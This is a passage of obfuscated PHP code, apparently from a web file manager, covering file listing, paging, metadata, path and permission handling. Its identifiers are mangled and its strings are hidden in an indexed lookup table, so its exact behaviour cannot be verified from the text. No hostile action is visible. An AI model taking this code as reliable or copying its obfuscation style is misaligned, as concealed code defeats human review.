_listPageCheck(&$ÅôÔŞô, $ˆàÍ¥¯©, $›ôí…) { $óš¼ƒ =& $_SERVER[Ù×¯Ø…]; if (!is_array($ÅôÔŞô[$óš¼ƒ[364]])) { return; } $Ëª‘Ã› = $ÅôÔŞô[$óš¼ƒ[364]]; if ($Ëª‘Ã›[$óš¼ƒ[366]] <= 1) { return; } if ($Ëª‘Ã›[$óš¼ƒ[365]] >= 100000) { return; } if (Model($óš¼ƒ[436])->get($óš¼ƒ[437]) != $óš¼ƒ[438]) { return; } $ˆàÍ¥¯© = str_replace(array($óš¼ƒ[50], $óš¼ƒ[340], $óš¼ƒ[229]), $óš¼ƒ[33], $ˆàÍ¥¯©); $ˆàÍ¥¯© = $óš¼ƒ[439] . str_replace($óš¼ƒ[47], $óš¼ƒ[440], $ˆàÍ¥¯©) . $óš¼ƒ[441]; $ó—¡ëˆ† = $óš¼ƒ[442]; $ó—¡ëˆ† = $ó—¡ëˆ† . $óš¼ƒ[443]; $èÉÑ”“ˆ = $Ëª‘Ã›[$óš¼ƒ[361]] * ($Ëª‘Ã›[$óš¼ƒ[351]] - 1) . $óš¼ƒ[47] . $Ëª‘Ã›[$óš¼ƒ[361]]; $ƒŠö¾ƒã = $this->_makeOrder(!0); $ÔÔÒÆ¡Š = $óš¼ƒ[439] . str_replace($óš¼ƒ[47], $óš¼ƒ[440], $ƒŠö¾ƒã[0]); if (strpos($ÔÔÒÆ¡Š, $óš¼ƒ[444])) { $ÔÔÒÆ¡Š = str_replace($óš¼ƒ[444], $óš¼ƒ[445], $ÔÔÒÆ¡Š); } else { $ÔÔÒÆ¡Š .= $óš¼ƒ[446] . $ƒŠö¾ƒã[1]; } $íæóÙü = array(); foreach ($›ôí… as $ãÎ¢ÜöÍ => $¨ßæ©ü) { $íæóÙü[$óš¼ƒ[439] . $ãÎ¢ÜöÍ] = $¨ßæ©ü; } $this->alias($óš¼ƒ[447])->field($ˆàÍ¥¯©)->limit($èÉÑ”“ˆ)->order($ÔÔÒÆ¡Š); $¶­Äà›µ = $this->join($ó—¡ëˆ†)->where($íæóÙü)->select(); if ($¶­Äà›µ) { $ÅôÔŞô[$óš¼ƒ[367]] = $¶­Äà›µ; } } protected function _makeOrder($ÍãÖÅ¹Ã = false) { $ÚŞÑ …Œ =& $_SERVER[Ù×¯Ø…]; $ à…íé = Model($ÚŞÑ …Œ[448])->get($ÚŞÑ …Œ[449]); $şü›•ƒã = Model($ÚŞÑ …Œ[448])->get($ÚŞÑ …Œ[450]); $¥½úÜ´ = array($ÚŞÑ …Œ[451] => $ÚŞÑ …Œ[452], $ÚŞÑ …Œ[453] => $ÚŞÑ …Œ[454]); $©â·ìı§ = array($ÚŞÑ …Œ[28] => $ÚŞÑ …Œ[28], $ÚŞÑ …Œ[78] => $ÚŞÑ …Œ[78], $ÚŞÑ …Œ[168] => $ÚŞÑ …Œ[416], $ÚŞÑ …Œ[455] => $ÚŞÑ …Œ[455], $ÚŞÑ …Œ[456] => $ÚŞÑ …Œ[457], $ÚŞÑ …Œ[194] => $ÚŞÑ …Œ[194], $ÚŞÑ …Œ[84] => $ÚŞÑ …Œ[84]); $ìÌêâÀ³ = Input::get($ÚŞÑ …Œ[458], $ÚŞÑ …Œ[7], $ à…íé, array_keys($©â·ìı§)); $Èî’ˆÀ = Input::get($ÚŞÑ …Œ[459], $ÚŞÑ …Œ[7], $şü›•ƒã, array_keys($¥½úÜ´)); if (!in_array($ìÌêâÀ³, array_keys($©â·ìı§))) { $ìÌêâÀ³ = $ÚŞÑ …Œ[28]; } if (!in_array($Èî’ˆÀ, array_keys($¥½úÜ´))) { $ìÌêâÀ³ = $ÚŞÑ …Œ[451]; } if ($ìÌêâÀ³ == $ÚŞÑ …Œ[28]) { } $ÖÜ‡ÜÓÀ = $ÚŞÑ …Œ[460] . $©â·ìı§[$ìÌêâÀ³] . $ÚŞÑ …Œ[50] . $¥½úÜ´[$Èî’ˆÀ]; $ÖÜ‡ÜÓÀ = rtrim(trim($ÖÜ‡ÜÓÀ), $ÚŞÑ …Œ[47]); if ($ÍãÖÅ¹Ã) { return array($ÖÜ‡ÜÓÀ, $¥½úÜ´[$Èî’ˆÀ]); } return $this->order($ÖÜ‡ÜÓÀ); } protected function _listDataApplyItem($È¿â¬Â—, $ğşÂ–Ù = false) { $‘©İ—ëœ = array($È¿â¬Â—); $this->_listDataApply($‘©İ—ëœ, $ğşÂ–Ù); return $‘©İ—ëœ[0]; } protected function _listDataApply(&$²ã²ã», $ÁÆ«°«í = false) { $éÏÖÔÅ‘ =& $_SERVER[Ù×¯Ø…]; if (!$²ã²ã») { $²ã²ã» = array(); return; } $ÂîóÕœÏ = array_to_keyvalue($²ã²ã», $éÏÖÔÅ‘[33], $éÏÖÔÅ‘[406]); $ÂîóÕœÏ = array_unique($ÂîóÕœÏ); $this->_listSourceCache($²ã²ã»); if (!$ÁÆ«°«í) { $this->_listAppendMeta($²ã²ã», $ÂîóÕœÏ); $this->_listAppendFileMeta($²ã²ã», $ÂîóÕœÏ); $this->_listAppendChildren($²ã²ã», $ÂîóÕœÏ); } $this->_listAppendPath($²ã²ã»); $this->_listAppendAuth($²ã²ã»); $this->_listAppendSourceInfo($²ã²ã», $ÂîóÕœÏ); $this->_listAppendUser($²ã²ã»); $this->_listFilterInfo($²ã²ã», $ÁÆ«°«í); $this->_listAppendAuthSecret($²ã²ã»); } protected function _listSourceCache($à„ù´«®) { $ëìù¬à =& $_SERVER[Ù×¯Ø…]; foreach ($à„ù´«® as $µ©¬ıœ‰) { self::$cacheSourceInfo[$ëìù¬à[461] . $µ©¬ıœ‰[$ëìù¬à[406]]] = $µ©¬ıœ‰; } } protected function _listFilterInfo(&$éÊ·–Šï, $…Û©ı¤¸ = false) { $Ô‡äÊ§ =& $_SERVER[Ù×¯Ø…]; foreach ($éÊ·–Šï as &$æò¾’Ô) { $æò¾’Ô = $this->pathInfoFilter($æò¾’Ô); self::$cachePathInfo[$Ô‡äÊ§[462] . intval($…Û©ı¤¸) . $Ô‡äÊ§[463] . $æò¾’Ô[$Ô‡äÊ§[406]]] = $æò¾’Ô; } unset($æò¾’Ô); } protected function _listMake(&$šÎ¼ÔöÇ) { $ÄáæÉ÷ =& $_SERVER[Ù×¯Ø…]; $šÎ¼ÔöÇ[$ÄáæÉ÷[75]] = array(); $šÎ¼ÔöÇ[$ÄáæÉ÷[74]] = array(); foreach ($šÎ¼ÔöÇ[$ÄáæÉ÷[367]] as $ùºŠüÆ) { $€¹ïãòœ = $ùºŠüÆ[$ÄáæÉ÷[414]] == 1 ? $ÄáæÉ÷[75] : $ÄáæÉ÷[74]; $šÎ¼ÔöÇ[$€¹ïãòœ][] = $ùºŠüÆ; } unset($šÎ¼ÔöÇ[$ÄáæÉ÷[367]]); } protected function _listAppendMeta(&$…ÜÁÔ‡, $‰áÑçİê) { $ÍŠš´Ã¦ =& $_SERVER[Ù×¯Ø…]; $ıõ„§¬Ÿ = array($ÍŠš´Ã¦[421] => array($ÍŠš´Ã¦[422], $‰áÑçİê)); $¤İ´„Œ = Model($ÍŠš´Ã¦[464])->field($ÍŠš´Ã¦[465])->where($ıõ„§¬Ÿ)->select(); if (!$¤İ´„Œ) { return; } $ô†ĞÊ›ö = array($ÍŠš´Ã¦[466], $ÍŠš´Ã¦[467], $ÍŠš´Ã¦[445]); $Ù–éòõà = array(); foreach ($¤İ´„Œ as $›×èì‘‰) { if (!isset($Ù–éòõà[$›×èì‘‰[$ÍŠš´Ã¦[406]]])) { $Ù–éòõà[$›×èì‘‰[$ÍŠš´Ã¦[406]]] = array(); } if (in_array($›×èì‘‰[$ÍŠš´Ã¦[93]], $ô†ĞÊ›ö)) { continue; } $Ù–éòõà[$›×èì‘‰[$ÍŠš´Ã¦[406]]][$›×èì‘‰[$ÍŠš´Ã¦[93]]] = $›×èì‘‰[$ÍŠš´Ã¦[372]]; } foreach ($…ÜÁÔ‡ as &$ÒóÚåÆ) { $ÒóÚåÆ[$ÍŠš´Ã¦[468]] = !1; if (isset($Ù–éòõà[$ÒóÚåÆ[$ÍŠš´Ã¦[406]]])) { $ÒóÚåÆ[$ÍŠš´Ã¦[468]] = $Ù–éòõà[$ÒóÚåÆ[$ÍŠš´Ã¦[406]]]; } if ($this->fileIsLock($ÒóÚåÆ) && $ÒóÚåÆ[$ÍŠš´Ã¦[417]]) { $“½±ÅÓ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÒóÚåÆ[$ÍŠš´Ã¦[417]][$ÍŠš´Ã¦[418]] = AuthModel::authDisable($ÒóÚåÆ[$ÍŠš´Ã¦[417]][$ÍŠš´Ã¦[418]], $“½±ÅÓ); $ÒóÚåÆ[$ÍŠš´Ã¦[417]][$ÍŠš´Ã¦[469]][$ÍŠš´Ã¦[417]] = $ÒóÚåÆ[$ÍŠš´Ã¦[417]][$ÍŠš´Ã¦[418]]; } } unset($ÒóÚåÆ); } protected function _listAppendFileMeta(&$ŒØÁ¦™¦, $í«„Íœ) { $ë÷ÈØÃ© =& $_SERVER[Ù×¯Ø…]; $ã½Û¸»ä = array_to_keyvalue($ŒØÁ¦™¦, $ë÷ÈØÃ©[33], $ë÷ÈØÃ©[470]); $ã½Û¸»ä = array_filter(array_unique($ã½Û¸»ä)); if (!$ã½Û¸»ä) { return; } $åäñ—º¢ = array($ë÷ÈØÃ©[471] => array($ë÷ÈØÃ©[422], $ã½Û¸»ä)); $İøµ±² = $ë÷ÈØÃ©[472]; $ª·½™±Í = Model($ë÷ÈØÃ©[473])->field($İøµ±²)->where($åäñ—º¢)->select(); $ª·½™±Í = array_to_keyvalue($ª·½™±Í, $ë÷ÈØÃ©[470]); $°İ›²© = Model($ë÷ÈØÃ©[474])->field($ë÷ÈØÃ©[475])->where($åäñ—º¢)->select(); $°İ›²© = $°İ›²© ? $°İ›²© : array(); $úËÄÔîï = array(); foreach ($°İ›²© as $…µ„») { if (!isset($úËÄÔîï[$…µ„»[$ë÷ÈØÃ©[470]]])) { $úËÄÔîï[$…µ„»[$ë÷ÈØÃ©[470]]] = array(); } $úËÄÔîï[$…µ„»[$ë÷ÈØÃ©[470]]][$…µ„»[$ë÷ÈØÃ©[93]]] = $…µ„»[$ë÷ÈØÃ©[372]]; } foreach ($ŒØÁ¦™¦ as &$ÁŸÌÀı¨) { $ùÇŸ™öœ = $ÁŸÌÀı¨[$ë÷ÈØÃ©[470]]; if (!$ùÇŸ™öœ || !is_array($ª·½™±Í[$ùÇŸ™öœ])) { continue; } $åà–¦È‚ = $ª·½™±Í[$ùÇŸ™öœ]; $åà–¦È‚[$ë÷ÈØÃ©[78]] = $ÁŸÌÀı¨[$ë÷ÈØÃ©[78]]; $åà–¦È‚[$ë÷ÈØÃ©[28]] = $ÁŸÌÀı¨[$ë÷ÈØÃ©[28]]; if (!isset(self::$cacheFileInfo[$ë÷ÈØÃ©[476] . $ùÇŸ™öœ])) { self::$cacheFileInfo[$ë÷ÈØÃ©[476] . $ùÇŸ™öœ] = array_merge(array(), $åà–¦È‚); } unset($ª·½™±Í[$ùÇŸ™öœ][$ë÷ÈØÃ©[76]]); $ëüé´Üï = is_array($úËÄÔîï[$ùÇŸ™öœ]) ? $úËÄÔîï[$ùÇŸ™öœ] : array(); $ÁŸÌÀı¨[$ë÷ÈØÃ©[164]] = array_merge($ëüé´Üï, $ª·½™±Í[$ùÇŸ™öœ]); if (isset($ÁŸÌÀı¨[$ë÷ÈØÃ©[164]][$ë÷ÈØÃ©[163]])) { $ÁŸÌÀı¨[$ë÷ÈØÃ©[163]] = json_decode($ÁŸÌÀı¨[$ë÷ÈØÃ©[164]][$ë÷ÈØÃ©[163]], !0); unset($ÁŸÌÀı¨[$ë÷ÈØÃ©[164]][$ë÷ÈØÃ©[163]]); } } unset($ÁŸÌÀı¨); } protected function _listAppendSourceInfo(&$Ñ„È™Á, $ãÄ½‘À¿) { $½‘ÉÑÊ­ =& $_SERVER[Ù×¯Ø…]; if (!defined($½‘ÉÑÊ­[477])) { return; } $’ëÍèç  = Model($½‘ÉÑÊ­[478])->listData(); $›á“òÇ¢ = Model($½‘ÉÑÊ­[429])->listData(); $“°Æ‚»ö = Model($½‘ÉÑÊ­[419])->listData(); $®÷ÌëØ² = Model($½‘ÉÑÊ­[479])->listSimple(); $ÊïÀ¨ = array_to_keyvalue($’ëÍèç , $½‘ÉÑÊ­[395]); $Çƒ«û¿· = array_to_keyvalue_group($›á“òÇ¢, $½‘ÉÑÊ­[76], $½‘ÉÑÊ­[430]); $êÀŸÄÓ = array_to_keyvalue($“°Æ‚»ö, $½‘ÉÑÊ­[76]); $å•Ì¹Á™ = array_to_keyvalue_group($®÷ÌëØ², $½‘ÉÑÊ­[406]); foreach ($Ñ„È™Á as &$·ÜÃ²ëŒ) { $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]] = array($½‘ÉÑÊ­[480] => 0, $½‘ÉÑÊ­[481] => 0, $½‘ÉÑÊ­[482] => 0); if (isset($êÀŸÄÓ[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]])) { $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[483]] = 1; $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[484]] = $êÀŸÄÓ[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]][$½‘ÉÑÊ­[28]]; } if (isset($Çƒ«û¿·[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]])) { $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[485]] = array(); foreach ($Çƒ«û¿·[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]] as $Ù™­šâï) { $ùÃ£æŒà = $ÊïÀ¨[$Ù™­šâï]; $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[485]][] = array($½‘ÉÑÊ­[486] => $ùÃ£æŒà[$½‘ÉÑÊ­[395]], $½‘ÉÑÊ­[424] => $ùÃ£æŒà[$½‘ÉÑÊ­[28]], $½‘ÉÑÊ­[487] => $ùÃ£æŒà[$½‘ÉÑÊ­[488]]); } } if (isset($å•Ì¹Á™[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]])) { $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[489]] = array(); foreach ($å•Ì¹Á™[$·ÜÃ²ëŒ[$½‘ÉÑÊ­[406]]] as $“öªıĞ) { $·ÜÃ²ëŒ[$½‘ÉÑÊ­[85]][$½‘ÉÑÊ­[489]] = array($½‘ÉÑÊ­[490] => $“öªıĞ[$½‘ÉÑÊ­[491]], $½‘ÉÑÊ­[492] => $“öªıĞ[$½‘ÉÑÊ­[493]], $½‘ÉÑÊ­[494] => $“öªıĞ[$½‘ÉÑÊ­[406]], $½‘ÉÑÊ­[495] => $“öªıĞ[$½‘ÉÑÊ­[496]], $½‘ÉÑÊ­[497] => $“öªıĞ[$½‘ÉÑÊ­[498]], $½‘ÉÑÊ­[499] => $“öªıĞ[$½‘ÉÑÊ­[499]], $½‘ÉÑÊ­[500] => $“öªıĞ[$½‘ÉÑÊ­[500]]); } } } unset($·ÜÃ²ëŒ); return $Ñ„È™Á; } protected function _listAppendChildren(&$ÃÈ«Å×Â, $ÚÄ¼óä†) { $ò…í–ò¡ =& $_SERVER[Ù×¯Ø…]; $ŒÀÕĞŒ = array(); $İäšû“È = array($ò…í–ò¡[203] => 0, $ò…í–ò¡[204] => 0); foreach ($ÃÈ«Å×Â as &$ «ìñÃ–) { if (!$ «ìñÃ–[$ò…í–ò¡[414]]) { continue; } $ŒÀÕĞŒ[] = $ «ìñÃ–[$ò…í–ò¡[406]]; } unset($ «ìñÃ–); if (!$ŒÀÕĞŒ) { return; } $ÂÙ“ş¥Å = array($ò…í–ò¡[501] => array($ò…í–ò¡[7], $ŒÀÕĞŒ)); $µ¬¡‹¡ = array($ò…í–ò¡[501], $ò…í–ò¡[414], $ò…í–ò¡[502] => $ò…í–ò¡[503]); $ßß¯ú×ï = $this->field($µ¬¡‹¡)->where($ÂÙ“ş¥Å)->group($ò…í–ò¡[504])->select(); $®à§Î¨Ï = array(); foreach ($ßß¯ú×ï as $ìğ“ğüö) { $Çá¸´¹ = $ìğ“ğüö[$ò…í–ò¡[501]]; $Õ»“©é· = $ìğ“ğüö[$ò…í–ò¡[414]] == $ò…í–ò¡[87] ? $ò…í–ò¡[204] : $ò…í–ò¡[203]; if (!isset($®à§Î¨Ï[$Çá¸´¹])) { $®à§Î¨Ï[$Çá¸´¹] = array($ò…í–ò¡[203] => 0, $ò…í–ò¡[204] => 0); } $®à§Î¨Ï[$Çá¸´¹][$Õ»“©é·] += $ìğ“ğüö[$ò…í–ò¡[503]]; } foreach ($ÃÈ«Å×Â as &$ «ìñÃ–) { if (!$ «ìñÃ–[$ò…í–ò¡[414]]) { continue; } $ÛšŠéı· = is_array($®à§Î¨Ï[$ «ìñÃ–[$ò…í–ò¡[406]]]) ? $®à§Î¨Ï[$ «ìñÃ–[$ò…í–ò¡[406]]] : $İäšû“È; $ «ìñÃ–[$ò…í–ò¡[204]] = $ÛšŠéı·[$ò…í–ò¡[204]]; $ «ìñÃ–[$ò…í–ò¡[203]] = $ÛšŠéı·[$ò…í–ò¡[203]]; unset($ «ìñÃ–[$ò…í–ò¡[416]]); } unset($ «ìñÃ–); } protected function _listAppendAuth(&$ñÓ÷¤·ó) { $—ÙèÅ =& $_SERVER[Ù×¯Ø…]; if (!defined($—ÙèÅ[477])) { return; } $Î£ãÎŸœ = array(); foreach ($ñÓ÷¤·ó as $»¤«ÓÁ) { if ($»¤«ÓÁ[$—ÙèÅ[415]] == self::TYPE_GROUP) { $Î£ãÎŸœ[] = $»¤«ÓÁ[$—ÙèÅ[406]]; } } if (!$Î£ãÎŸœ) { return; } $¯ë†ßÍ = array_to_keyvalue($ñÓ÷¤·ó, $—ÙèÅ[406]); $Î¬‘Ÿ¿â = Model($—ÙèÅ[505])->getSourceList($Î£ãÎŸœ, $¯ë†ßÍ); foreach ($ñÓ÷¤·ó as $ÂŠ‰œìß => &$»¤«ÓÁ) { $»¤«ÓÁ[$—ÙèÅ[417]] = $Î¬‘Ÿ¿â[$»¤«ÓÁ[$—ÙèÅ[406]]]; if (!$»¤«ÓÁ[$—ÙèÅ[417]] && $»¤«ÓÁ[$—ÙèÅ[415]] == self::TYPE_GROUP) { $»¤«ÓÁ[$—ÙèÅ[417]] = Action($—ÙèÅ[506])->pathGroupAuthMake($»¤«ÓÁ[$—ÙèÅ[507]]); if (!$»¤«ÓÁ[$—ÙèÅ[417]] && !_get($GLOBALS, $—ÙèÅ[508])) { $»¤«ÓÁ[$—ÙèÅ[196]] = !1; $»¤«ÓÁ[$—ÙèÅ[195]] = !1; } } if ($»¤«ÓÁ[$—ÙèÅ[417]]) { $»¤«ÓÁ[$—ÙèÅ[196]] = AuthModel::authCheckEdit($»¤«ÓÁ[$—ÙèÅ[417]][$—ÙèÅ[418]]); $»¤«ÓÁ[$—ÙèÅ[195]] = AuthModel::authCheckView($»¤«ÓÁ[$—ÙèÅ[417]][$—ÙèÅ[418]]); } $this->groupPathDisplay($»¤«ÓÁ); } unset($»¤«ÓÁ); } public function _listAppendAuthSecret(&$£Ãº‡Æê) { $ã™ïË²Ú =& $_SERVER[Ù×¯Ø…]; if (Model($ã™ïË²Ú[436])->get($ã™ïË²Ú[509]) != $ã™ïË²Ú[87]) { return; } static $ô÷ªõ¨‘ = false; if (!$ô÷ªõ¨‘) { $é†¬»¥” = Model($ã™ïË²Ú[510]); $ŠöáìÊà = Model($ã™ïË²Ú[511]); $ô÷ªõ¨‘ = $ŠöáìÊà->listData(); $ô÷ªõ¨‘ = array_to_keyvalue($ô÷ªõ¨‘, $ã™ïË²Ú[406]); $ŸÌ¾Âõ‘ = json_decode(Model($ã™ïË²Ú[436])->get($ã™ïË²Ú[512]), !0); $ŸÌ¾Âõ‘ = array_to_keyvalue($ŸÌ¾Âõ‘, $ã™ïË²Ú[395]); foreach ($ô÷ªõ¨‘ as $¨¡„Àù² => $×ÔÊõİè) { $™ÕÎ¸´Æ = $ŸÌ¾Âõ‘[$×ÔÊõİè[$ã™ïË²Ú[513]]]; if (!$™ÕÎ¸´Æ) { $ŠöáìÊà->remove($×ÔÊõİè[$ã™ïË²Ú[395]]); unset($ô÷ªõ¨‘[$¨¡„Àù²]); continue; } $å¯Â½îÇ = $é†¬»¥”->listData($™ÕÎ¸´Æ[$ã™ïË²Ú[417]]); if (!$å¯Â½îÇ) { $ŠöáìÊà->remove($×ÔÊõİè[$ã™ïË²Ú[395]]); unset($ô÷ªõ¨‘[$¨¡„Àù²]); continue; } $×ÔÊõİè[$ã™ïË²Ú[417]] = $å¯Â½îÇ; $×ÔÊõİè[$ã™ïË²Ú[514]] = $™ÕÎ¸´Æ; $×ÔÊõİè[$ã™ïË²Ú[515]] = Model($ã™ïË²Ú[516])->getInfoSimpleOuter($×ÔÊõİè[$ã™ïË²Ú[455]]); $ô÷ªõ¨‘[$¨¡„Àù²] = $×ÔÊõİè; } } $‚Ä‚¬ó² = defined($ã™ïË²Ú[517]) ? USER_ID : $ã™ïË²Ú[33]; $€îú€º’ = array(); $œ€§æ‹ = $this->_listAppendPath($€îú€º’, !0); foreach ($£Ãº‡Æê as $¨¡„Àù² => &$×ÔÊõİè) { if (!is_array($×ÔÊõİè[$ã™ïË²Ú[417]])) { continue; } if ($×ÔÊõİè[$ã™ïË²Ú[415]] != $ã™ïË²Ú[518]) { continue; } if (isset($ô÷ªõ¨‘[$×ÔÊõİè[$ã™ïË²Ú[406]]])) { $‹“È–‹ = $ô÷ªõ¨‘[$×ÔÊõİè[$ã™ïË²Ú[406]]]; if (!is_array($×ÔÊõİè[$ã™ïË²Ú[468]])) { $×ÔÊõİè[$ã™ïË²Ú[468]] = array(); } $×ÔÊõİè[$ã™ïË²Ú[468]][$ã™ïË²Ú[519]] = $‹“È–‹[$ã™ïË²Ú[513]]; $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[520]] = $‹“È–‹; $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[521]] = $×ÔÊõİè[$ã™ïË²Ú[522]]; $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[523]] = $ã™ïË²Ú[87]; if ($‹“È–‹[$ã™ïË²Ú[455]] != $‚Ä‚¬ó²) { $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[418]] = $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[418]] & $‹“È–‹[$ã™ïË²Ú[417]][$ã™ïË²Ú[417]]; } continue; } $¡§à‡œ‰ = $this->parentLevelArray($×ÔÊõİè[$ã™ïË²Ú[524]]); $Î¯ã¢½Ú = array_reverse($¡§à‡œ‰); foreach ($Î¯ã¢½Ú as $ÜıÆ¾ÖÀ => $©ŒîİÆ) { if (!isset($ô÷ªõ¨‘[$©ŒîİÆ])) { continue; } $‹“È–‹ = $ô÷ªõ¨‘[$©ŒîİÆ]; $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[520]] = $‹“È–‹; if ($‹“È–‹[$ã™ïË²Ú[455]] != $‚Ä‚¬ó²) { $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[418]] = $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[418]] & $‹“È–‹[$ã™ïË²Ú[417]][$ã™ïË²Ú[417]]; } $ù®ÆÛ¥¾ = $ã™ïË²Ú[33]; $”¸§Åœ = count($¡§à‡œ‰) - $ÜıÆ¾ÖÀ; for ($…®à§¨ = 0; $…®à§¨ < $”¸§Åœ; $…®à§¨++) { if (!isset($œ€§æ‹[$¡§à‡œ‰[$…®à§¨]])) { $ù®ÆÛ¥¾ = $ã™ïË²Ú[33]; break; } $ù®ÆÛ¥¾ = $ù®ÆÛ¥¾ . rtrim($œ€§æ‹[$¡§à‡œ‰[$…®à§¨]], $ã™ïË²Ú[8]) . $ã™ïË²Ú[8]; } $×ÔÊõİè[$ã™ïË²Ú[417]][$ã™ïË²Ú[521]] = rtrim($ù®ÆÛ¥¾, $ã™ïË²Ú[8]) . $ã™ïË²Ú[8]; break; } } unset($×ÔÊõİè); } public function groupPathDisplay(&$ ¹ÑñÌà) { $…¹óæø =& $_SERVER[Ù×¯Ø…]; if ($ ¹ÑñÌà[$…¹óæø[415]] != self::TYPE_GROUP) { return; } $¿ú¨ğ§Ø = Model($…¹óæø[525])->getInfo($ ¹ÑñÌà[$…¹óæø[507]]); $×ƒ”ëÙí = $this->parentLevelArray($¿ú¨ğ§Ø[$…¹óæø[524]]); $ï’Í’¢ = $…¹óæø[33]; foreach ($×ƒ”ëÙí as $ô…–š) { $£±Œ×’÷ = Model($…¹óæø[525])->getInfo($ô…–š); $ï’Í’¢ .= $£±Œ×’÷[$…¹óæø[85]][$…¹óæø[406]] . $…¹óæø[47]; } $ ¹ÑñÌà[$…¹óæø[526]] = $¿ú¨ğ§Ø[$…¹óæø[501]]; $ ¹ÑñÌà[$…¹óæø[527]] = $¿ú¨ğ§Ø[$…¹óæø[524]]; $ ¹ÑñÌà[$…¹óæø[528]] = $¿ú¨ğ§Ø[$…¹óæø[529]]; $ ¹ÑñÌà[$…¹óæø[530]] = $ï’Í’¢ . $¿ú¨ğ§Ø[$…¹óæø[85]][$…¹óæø[406]]; } protected function _listAppendPath(&$ÀåÙÙ†, $Ã²¤€æ¬ = false) { $ÍâƒÆŒñ =& $_SERVER[Ù×¯Ø…]; static $µûàş¤é = array(); $¢¦Ûï­Á = array(); $”¿Ø¡Ì = array(); if ($Ã²¤€æ¬) { return $µûàş¤é; } foreach ($ÀåÙÙ† as &$Ã­‹ï‘™) { $ùûîàÒÁ = $Ã­‹ï‘™[$ÍâƒÆŒñ[406]]; if ($Ã­‹ï‘™[$ÍâƒÆŒñ[414]] == $ÍâƒÆŒñ[87] && $Ã­‹ï‘™[$ÍâƒÆŒñ[501]] != 0) { $µûàş¤é[$ùûîàÒÁ] = $Ã­‹ï‘™[$ÍâƒÆŒñ[28]]; } if ($Ã­‹ï‘™[$ÍâƒÆŒñ[414]] == $ÍâƒÆŒñ[87] && $Ã­‹ï‘™[$ÍâƒÆŒñ[501]] == 0 && !isset($µûàş¤é[$ùûîàÒÁ])) { $µûàş¤é[$ùûîàÒÁ] = $this->_listAppendPathRoot($Ã­‹ï‘™, array()); } if (isset($”¿Ø¡Ì[$Ã­‹ï‘™[$ÍâƒÆŒñ[524]]])) { continue; } $”¿Ø¡Ì[$Ã­‹ï‘™[$ÍâƒÆŒñ[524]]] = !0; $»¬ëà‰¥ = $this->parentLevelArray($Ã­‹ï‘™[$ÍâƒÆŒñ[524]]); foreach ($»¬ëà‰¥ as $ûˆ×ïš => $ƒƒ×¹ö) { if (isset($µûàş¤é[$ƒƒ×¹ö])) { continue; } if ($ûˆ×ïš == 0) { $µûàş¤é[$ƒƒ×¹ö] = $this->_listAppendPathRoot($Ã­‹ï‘™, $»¬ëà‰¥); } if ($ûˆ×ïš != 0) { $¢¦Ûï­Á[] = $ƒƒ×¹ö; } } } unset($Ã­‹ï‘™); $¢¦Ûï­Á = array_unique($¢¦Ûï­Á); if (count($¢¦Ûï­Á) > 0) { $ãëÍâ¿Å = array($ÍâƒÆŒñ[421] => array($ÍâƒÆŒñ[422], $¢¦Ûï­Á)); if (count($¢¦Ûï­Á) == 1) { $ù²Ö­ËÅ = $this->sourceInfo($¢¦Ûï­Á[0]); $â÷ì‹©ë = is_array($ù²Ö­ËÅ) ? array($ù²Ö­ËÅ) : !1; } else { $â÷ì‹©ë = $this->field($ÍâƒÆŒñ[531])->where($ãëÍâ¿Å)->select(); } if (!$â÷ì‹©ë) { $â÷ì‹©ë = array(); } foreach ($â÷ì‹©ë as $ûß½íÒ¹) { $µûàş¤é[$ûß½íÒ¹[$ÍâƒÆŒñ[406]]] = $ûß½íÒ¹[$ÍâƒÆŒñ[28]]; } } $»âºİ‹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $±éÛñïİ = array(); foreach ($ÀåÙÙ† as &$Ã­‹ï‘™) { $ñÈ§ßä = $Ã­‹ï‘™[$ÍâƒÆŒñ[524]]; $ıÅ«„­ï = $ÍâƒÆŒñ[33]; if (isset($±éÛñïİ[$ñÈ§ßä])) { $ıÅ«„­ï = $±éÛñïİ[$ñÈ§ßä]; } else { $»¬ëà‰¥ = $this->parentLevelArray($Ã­‹ï‘™[$ÍâƒÆŒñ[524]]); foreach ($»¬ëà‰¥ as $ûˆ×ïš => $ƒƒ×¹ö) { if (isset($µûàş¤é[$ƒƒ×¹ö])) { $ıÅ«„­ï .= $µûàş¤é[$ƒƒ×¹ö] . $ÍâƒÆŒñ[8]; } } $±éÛñïİ[$ñÈ§ßä] = $ıÅ«„­ï; } $ıÅ«„­ï .= $Ã­‹ï‘™[$ÍâƒÆŒñ[28]]; if ($Ã­‹ï‘™[$ÍâƒÆŒñ[414]] == $ÍâƒÆŒñ[87]) { $ıÅ«„­ï .= $ÍâƒÆŒñ[8]; } $Ã­‹ï‘™[$ÍâƒÆŒñ[522]] = str_replace($ÍâƒÆŒñ[532], $ÍâƒÆŒñ[8], $ıÅ«„­ï); if ($Ã­‹ï‘™[$ÍâƒÆŒñ[501]] == $ÍâƒÆŒñ[191]) { $Ã­‹ï‘™[$ÍâƒÆŒñ[28]] = trim($µûàş¤é[$Ã­‹ï‘™[$ÍâƒÆŒñ[406]]], $ÍâƒÆŒñ[8]); $Ã­‹ï‘™[$ÍâƒÆŒñ[522]] = 